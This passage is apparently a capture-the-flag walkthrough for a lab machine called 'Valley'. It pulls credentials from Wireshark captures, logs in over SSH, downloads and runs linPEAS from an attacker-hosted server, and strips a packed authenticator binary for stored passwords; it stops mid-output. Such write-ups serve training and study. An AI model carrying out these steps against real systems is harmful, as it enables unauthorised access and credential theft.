+13	2.714921360	34.218.221.118	80	192.168.111.136	58554	HTTP	1505	HTTP/1.1 404 Not Found  (text/html)
+28	5.933012299	192.168.111.136	47420	34.218.221.118	80	HTTP	464	<strong>GET /testcat_mo.html HTTP/1.1</strong>
+30	6.017651030	34.218.221.118	80	192.168.111.136	47420	HTTP	877	<strong>HTTP/1.1 200 OK  (text/html)</strong>
+36	10.233965934	192.168.111.136	47420	34.218.221.118	80	HTTP	464	<strong>GET /testcat_pr.html HTTP/1.1</strong>
+40	10.318048977	34.218.221.118	80	192.168.111.136	47420	HTTP	871	<strong>HTTP/1.1 200 OK  (text/html)</strong>
+46	14.658033313	192.168.111.136	47420	34.218.221.118	80	HTTP	464	<strong>GET /testcat_pu.html HTTP/1.1</strong>
+48	14.743084091	34.218.221.118	80	192.168.111.136	47420	HTTP	852	<strong>HTTP/1.1 200 OK  (text/html)</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+# File: <strong>siemHTTP2.pcapng</strong>
+Wireshark Filter: <strong>http</strong>
+
+2252	19.856302900	192.168.111.136	51992	192.168.111.136	80	HTTP	417	GET /index.html HTTP/1.1
+2254	19.856831135	192.168.111.136	80	192.168.111.136	51992	HTTP	774	HTTP/1.1 200 OK  (text/html)
+2256	19.916759196	192.168.111.136	51992	192.168.111.136	80	HTTP	376	GET /img_avatar2.png HTTP/1.1
+2257	19.916865505	192.168.111.136	80	192.168.111.136	51992	HTTP	561	HTTP/1.1 404 Not Found  (text/html)
+2259	19.932270905	192.168.111.136	51992	192.168.111.136	80	HTTP	372	GET /favicon.ico HTTP/1.1
+2260	19.934134999	192.168.111.136	80	192.168.111.136	51992	HTTP	561	HTTP/1.1 404 Not Found  (text/html)
+2335	43.880057790	192.168.111.136	47096	192.168.111.136	80	HTTP	605	<strong>POST /index.html HTTP/1.1  (application/x-www-form-urlencoded)</strong>
+2337	43.880318347	192.168.111.136	80	192.168.111.136	47096	HTTP	774	HTTP/1.1 200 OK  (text/html)
+2339	43.999849893	192.168.111.136	47096	192.168.111.136	80	HTTP	376	GET /img_avatar2.png HTTP/1.1
+2340	44.000099699	192.168.111.136	80	192.168.111.136	47096	HTTP	561	HTTP/1.1 404 Not Found  (text/html)
+
+# Let's search for other POST REQUESTS
+Wireshark Filter:
+<strong>http.request.method == "POST"</strong>
+
+2191	16.382782089	192.168.111.136	47168	99.86.228.28	80	OCSP	481	Request
+2214	16.429568568	192.168.111.136	39106	172.253.62.94	80	OCSP	475	Request
+2216	16.429835379	192.168.111.136	39100	172.253.62.94	80	OCSP	475	Request
+2335	43.880057790	192.168.111.136	47096	192.168.111.136	80	HTTP	605	<strong>POST /index.html HTTP/1.1  (application/x-www-form-urlencoded)</strong>
+2677	55.418684191	192.168.111.136	43210	99.86.228.28	80	OCSP	481	Request
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+# Let's inspect the <strong>POST REQUEST (Packet: 2335)</strong> a bit closer
+```
+
+
+
+
+
+
+
+
+
+![](./img/wp-content-uploads-2023-06-wireshark-valley.png)
+
+
+
+
+
+
+
+
+
+```
+# We found some credentials, let's checkout the login page with this credentials or SSH
+
+<strong>valleyDev:ph0t0s1234</strong>
+
+# Login Page
+F=Invalid username and/or password
+
+# SSH
+<strong><em>< successful ></em></strong>
+```
+
+
+
+
+
+```
+ssh valleyDev@10.10.228.74
+
+The authenticity of host '10.10.228.74 (10.10.228.74)' can't be established.
+ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols.
+This key is not known by any other names.
+
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+
+Warning: Permanently added '10.10.228.74' (ED25519) to the list of known hosts.
+
+valleyDev@10.10.228.74's password:ph0t0s1234
+
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+valleyDev@valley:~$
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### Weaponization
+
+
+
+
+
+```
+# It's time for <strong>linPEAS</strong> !
+```
+
+
+
+
+
+- 
+
+
+
+
+
+---
+
+
+
+
+
+#### Delivery
+
+
+
+
+
+```
+# Let's get linPEAS to the VICTIM MACHINE
+```
+
+
+
+
+
+1. 
+2. On ATTACKER machine make a python simple HTTP server Port: 80
+3. 
+4.
+5. 
+6. On VICTIM machine download with wget linPEAS.sh
+7. 
+8.
+9. 
+10. Execute !
+11. 
+
+
+
+
+
+```
+# Step 1
+sudo python3 -m http.server 80
+
+# Step 2
+cd /tmp
+wget http://10.11.8.178/linpeas.sh
+
+--2023-06-12 11:24:18--  http://10.11.8.178/linpeas.sh
+Connecting to 10.11.8.178:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 830803 (811K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                           100%[====================================================================================================================>] 811.33K   598KB/s    in 1.4s
+
+2023-06-12 11:24:20 (598 KB/s) - ‘linpeas.sh’ saved [830803/830803]
+
+# Step 3
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### Exploit
+
+
+
+
+
+##### linPEAS
+
+
+
+
+
+```
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------|
+    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
+    |         Follow on Twitter         :     @carlospolopm                           |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          linpeas-ng by carlospolop
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+ LEGEND:
+  <strong>RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted</strong> devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### linPEAS FINDINGS
+
+
+
+
+
+```
+═══════════════════════════════╣ <strong>Basic information</strong> ╠═══════════════════════════════
+                               ╚═══════════════════╝
+<strong>OS: Linux version 5.4.0-139-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023</strong>
+User & Groups: <strong>uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)</strong>
+Hostname: <strong>valley</strong>
+Writable folder: <strong>/dev/shm</strong>
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
+[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+╔══════════╣ <strong>PATH</strong>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
+<strong>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</strong>
+
+╔══════════╣ <strong>Environment</strong>
+╚ <strong>Any private information inside environment variables?</strong>
+HISTFILESIZE=0
+USER=valleyDev
+SSH_CLIENT=10.11.8.178 54654 22
+XDG_SESSION_TYPE=tty
+SHLVL=1
+MOTD_SHOWN=pam
+HOME=/home/valleyDev
+OLDPWD=/home/valleyDev
+SSH_TTY=/dev/pts/0
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
+LOGNAME=valleyDev
+_=./linpeas.sh
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+XDG_SESSION_ID=121
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+XDG_RUNTIME_DIR=/run/user/1002
+LANG=en_US.UTF-8
+HISTSIZE=0
+SHELL=/bin/bash
+PWD=/tmp
+SSH_CONNECTION=10.11.8.178 54654 10.10.228.74 22
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+HISTFILE=/dev/null
+
+                ╔════════════════════════════════════════════════╗
+════════════════╣ <strong>Processes, Crons, Timers, Services and Sockets</strong> ╠════════════════
+                ╚════════════════════════════════════════════════╝
+╔══════════╣ <strong>Cleaned processes</strong>
+╚ <strong>Check weird & unexpected proceses run by root:</strong> https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
+root           1  0.0  1.1 168064 11548 ?        Ss   09:20   0:01 /sbin/init auto noprompt
+root         223  0.0  0.8  38124  8700 ?        S<s  09:21   0:00 /lib/systemd/systemd-journald
+root         272  0.0  0.7  22148  7572 ?        Ss   09:21   0:01 /lib/systemd/systemd-udevd
+systemd+     284  0.0  0.6  90904  6100 ?        Ssl  09:21   0:00 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+systemd+     292  0.0  0.7  27264  7604 ?        Ss   09:21   0:00 /lib/systemd/systemd-networkd
+  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+systemd+     304  0.0  1.2  24412 11776 ?        Ss   09:21   0:00 /lib/systemd/systemd-resolved
+root         380  0.0  0.7 238164  7204 ?        Ssl  09:21   0:00 /usr/lib/accountsservice/accounts-daemon
+root         381  0.0  0.0   2540   712 ?        Ss   09:21   0:00 /usr/sbin/acpid
+avahi        410  0.0  0.0   8340   328 ?        S    09:21   0:00  _ avahi-daemon: chroot helper
+root         385  0.0  0.3   9416  2972 ?        Ss   09:21   0:00 /usr/sbin/cron -f
+message+     386  0.0  0.4   7940  4604 ?        Ss   09:21   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root         387  0.0  1.9 261712 18784 ?        Ssl  09:21   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+root         393  0.0  0.3  81824  3608 ?        Ssl  09:21   0:00 /usr/sbin/irqbalance --foreground
+root         395  0.0  2.0  39720 20468 ?        Ss   09:21   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         396  0.0  0.9 234840  8788 ?        Ssl  09:21   0:00 /usr/lib/policykit-1/polkitd --no-debug
+syslog       398  0.0  0.4 224520  4396 ?        Ssl  09:21   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         399  0.0  3.8 875324 37348 ?        Ssl  09:21   0:02 /usr/lib/snapd/snapd
+root         400  0.0  0.7  17360  7652 ?        Ss   09:21   0:00 /lib/systemd/systemd-logind
+root         401  0.0  1.2 393204 11960 ?        Ssl  09:21   0:00 /usr/lib/udisks2/udisksd
+root         402  0.0  0.5  13688  4936 ?        Ss   09:21   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root         459  0.0  1.1 241356 11580 ?        Ssl  09:21   0:00 /usr/sbin/ModemManager
+root         486  0.0  0.3   6812  3108 ?        Ss   09:21   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+valleyD+    1551  0.0  0.6  14116  6120 ?        S    11:16   0:00      _ sshd: valleyDev@pts/0
+valleyD+    1552  0.0  0.4  10760  4856 pts/0    Ss   11:16   0:00          _ -bash
+valleyD+    1602  0.1  0.2   3476  2848 pts/0    S+   11:24   0:00              _ /bin/sh ./linpeas.sh
+valleyD+    4779  0.0  0.1   3476  1080 pts/0    S+   11:25   0:00                  _ /bin/sh ./linpeas.sh
+valleyD+    4783  0.0  0.3  11640  3276 pts/0    R+   11:25   0:00                  |   _ ps fauxwww
+valleyD+    4782  0.0  0.1   3476  1080 pts/0    S+   11:25   0:00                  _ /bin/sh ./linpeas.sh
+whoopsie     514  0.0  1.1 175260 11700 ?        Ssl  09:21   0:00 /usr/bin/whoopsie -f
+root         517  0.0  0.2   8200  2076 ttyS0    Ss+  09:21   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
+root         523  0.0  0.1   8428  1824 tty1     Ss+  09:21   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
+kernoops     530  0.0  0.0  11256   440 ?        Ss   09:21   0:00 /usr/sbin/kerneloops --test
+kernoops     532  0.0  0.0  11256   448 ?        Ss   09:21   0:00 /usr/sbin/kerneloops
+root         535  0.0  0.4   6700  4604 ?        Ss   09:21   0:00 /usr/sbin/apache2 -k start
+www-data     536  0.8  0.7 1212852 7500 ?        Sl   09:21   1:01  _ /usr/sbin/apache2 -k start
+www-data     537  0.6  0.7 1212812 6996 ?        Sl   09:21   0:51  _ /usr/sbin/apache2 -k start
+valleyD+    1520  0.0  0.9  19156  9664 ?        Ss   11:16   0:00 /lib/systemd/systemd --user
+valleyD+    1521  0.0  0.3 169468  3380 ?        S    11:16   0:00  _ (sd-pam)
+valleyD+    1528  0.0  1.4 280356 13844 ?        Ssl  11:16   0:00  _ /usr/bin/pulseaudio --daemonize=no --log-target=journal
+valleyD+    1562  0.0  0.4   7108  3928 ?        Ss   11:16   0:00  _ /usr/bin/dbus-daemon[0m --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+rtkit       1557  0.0  0.3 152928  3000 ?        SNsl 11:16   0:00 /usr/libexec/rtkit-daemon
+  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
+
+╔══════════╣ <strong>Cron jobs</strong>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
+<strong>/usr/bin/crontab</strong>
+incrontab Not Found
+<strong>-rw-r--r-- 1 root root    1107 Mar  6 19:56 /etc/crontab</strong>
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+<strong>1  *    * * *   root    python3 /photos/script/photosEncrypt.py</strong>
+
+╔══════════╣ <strong>Active Ports</strong>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+<strong>tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*</strong>
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*
+tcp   LISTEN 0      128                  [::]:22              [::]:*
+tcp   LISTEN 0      32                      *:37370              *:*
+tcp   LISTEN 0      511                     *:80                 *:*
+
+╔══════════╣ <strong>Superusers</strong>
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ <strong>Users with console</strong>
+root:x:0:0:root:/root:/bin/bash
+<strong>siemDev</strong>:x:1001:1001::<strong>/home/siemDev/ftp</strong>:/bin/sh
+<strong>valleyDev</strong>:x:1002:1002::<strong>/home/valleyDev</strong>:/bin/bash
+<strong>valley</strong>:x:1000:1000:,,,:<strong>/home/valley</strong>:/bin/bash
+
+╔══════════╣ <strong>Useful software</strong>
+/usr/bin/authbind
+/usr/bin/<strong>base64</strong>
+/usr/bin/<strong>gdb</strong>
+/usr/bin/<strong>nc</strong>
+/usr/bin/<strong>netcat</strong>
+/usr/bin/perl
+/usr/bin/ping
+/usr/bin/<strong>python3</strong>
+/usr/bin/<strong>sudo</strong>
+/usr/bin/<strong>wget</strong>
+/usr/bin/xterm
+
+╔══════════╣ <strong>Analyzing FTP Files</strong> (limit 70)
+-rw-r--r-- 1 root root 5867 Mar  6 21:56 /etc/vsftpd.conf
+anonymous_enable
+local_enable=YES
+#write_enable=YES
+#anon_upload_enable=YES
+#anon_mkdir_write_enable=YES
+#chown_uploads=YES
+#chown_username=whoever
+-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf
+-rw-r--r-- 1 root root 564 Mar  5  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf
+anonymous_enable
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r-- 1 root root 506 Mar  5  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
+anonymous_enable
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r-- 1 root root 260 Feb  1  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
+anonymous_enable
+local_enable=YES
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+
+                      ╔════════════════════════════════════╗
+══════════════════════╣ <strong>Files with Interesting Permissions</strong> ╠══════════════════════
+                      ╚════════════════════════════════════╝
+╔══════════╣ <strong>SUID - Check easy privesc, exploits and write perms</strong>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strings Not Found
+-rwsr-xr-x 1 root root 144K Dec  1  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 15K Feb  7 04:48 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 10K Jan 22  2017 /usr/lib/authbind/helper
+-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 163K Jan 16 05:06 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 15K Sep 19  2022 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root 121K Feb 22 07:11 /snap/snapd/18596/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 121K Jan 25 12:59 /snap/snapd/18357/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1828/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1828/usr/bin/chsh
+-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1828/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1828/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1828/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1828/usr/bin/su
+-rwsr-xr-x 1 root root 163K Jan 16 05:06 /snap/core20/1828/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1828/usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1611/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1611/usr/bin/chsh
+-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1611/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1611/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1611/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1611/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1611/usr/bin/su
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1611/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1611/usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-- 1 root systemd-resolve 51K Apr 29  2022 /snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1611/usr/lib/openssh/ssh-keysign
+
+╔══════════╣ <strong>Searching root files in home dirs</strong> (limit 30)
+/home/
+/home/valleyDev/.cache/tracker
+/home/valleyDev/.bash_history
+<strong>/home/valleyDev/user.txt</strong>
+<strong>/var/www/html/dev1243224123123/devNotes37370.txt</strong>
+<strong>/var/www/html/pricing/note.txt</strong>
+
+╔══════════╣ <strong>Unexpected in root</strong>
+/.bash_history
+<strong>/swapfile
+/photos</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+1. 
+2. Let's grab first **the low hanging fruits**
+3. 
+
+
+
+
+
+---
+
+
+
+
+
+#### Collection
+
+
+
+
+
+```
+# Get the <strong>user</strong> flag
+```
+
+
+
+
+
+```
+cat /home/valleyDev/user.txt
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### Discovery
+
+
+
+
+
+```
+# Let's check for other interesting findings
+```
+
+
+
+
+
+```
+ls -la /home
+
+total 752
+drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
+drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
+drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
+drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
+-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
+drwxr-xr-x  6 valleyDev valleyDev   4096 Jun 12 13:25 valleyDev
+```
+
+
+
+
+
+```
+# We know from linPEAS that their are 3 users
+1. siemDev
+2. valley
+3. valleyDev
+
+<strong># What is valleyAuthenticator ?</strong>
+```
+
+
+
+
+
+```
+./valleyAuthenticator
+
+Welcome to Valley Inc. Authenticator
+What is your username: valley
+What is your password: valley
+```
+
+
+
+
+
+```
+# It is an <strong>executable binary</strong>, which can check credentials.
+_ Maybe we are lucky and it has the passwords stored inside the executable binary
+
+# Let's get the file to our machine, to check the strings
+```
+
+
+
+
+
+```
+# Get the file to ATTACKER MACHINE with SCP
+sudo scp valleyDev@10.10.228.74:/home/valleyAuthenticator .
+
+# Check the strings of the binary / Let's check for MD5 since this needs the least strings in total
+# MD5 == 32 chars
+strings -n 32 valleyAuthenticator > binary.strings
+
+# Let's check the file: binary.strings
+subl binary.strings
+
+elcome to Valley Inc. Authentica
+ !"rrrr#$%&rrrr'()*rrrr+,-.rrrr/012rrrr3456rrrr789:rrrr;<=>rrrr?@ABrrrrCDEFrrrrGHIJrrrrKLMNyrrrOPQR
+ !9999"#$%9999&'()9999*+,-9999./0199992345999967899999:;<=9999>?@A9999BCDE9999FGHI9999JKLM9999NOPQ9999RSTV9999WXYZ9999[\]^9999_`ab9999cdef9999ghij9999klmn9999opqr9999stuv9999wxyz9999{|}~9999
+<>@BDhMh=F'JhMhM/N7RhMhM?VGZhMhMO^Wb
+$Info: This file is packed with the UPX executable packer http://upx.sf.net $
+$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
+
+# We see the binary is packed with UPX so we can't read the proper strings
+# Let's unpack the binary
+upx -d valleyAuthenticator
+
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+   2285616 <-    749128   32.78%   linux/amd64   valleyAuthenticator
+
+Unpacked 1 file
+
+# This command gets min. 32 chars of strings descending
+strings -n 32 valleyAuthenticator | awk '{ print length, $0 }' | sort -rn | cut -d' ' -f2- > binary.strings
+```
+
+
+
+
+
+```
+# File: <strong>binary.strings</strong>
+
+internal_ucs2reverse_loop_single
